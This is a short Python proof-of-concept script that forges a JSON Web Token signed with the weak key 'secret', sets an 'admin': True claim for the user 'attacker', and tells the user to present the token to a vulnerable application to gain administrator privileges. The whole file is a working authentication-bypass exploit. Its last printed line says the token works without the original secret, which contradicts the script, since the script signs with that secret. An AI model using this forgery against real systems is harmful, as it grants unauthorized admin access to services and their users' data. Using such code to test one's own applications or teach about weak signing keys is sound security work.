import jwt
import time

# Known (weak) secret key used by the vulnerable server
weak_secret = "secret"

# Attacker-controlled payload with elevated privileges
payload = {
    "user": "attacker",
    "admin": True,
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600  # Token valid for 1 hour
}

# JWT header specifies HMAC SHA256 algorithm
headers = {
    "alg": "HS256",
    "typ": "JWT"
}

# Forge the JWT token using the weak secret
forged_token = jwt.encode(payload, weak_secret, algorithm="HS256", headers=headers)

print("=== JWT Weak Secret Attack PoC ===")
print("Forged JWT token:")
print(forged_token)
print()
print("Use this token on the vulnerable application where 'secret' is the signing key.")
print("This token grants admin privileges to 'attacker' without needing the original secret.")

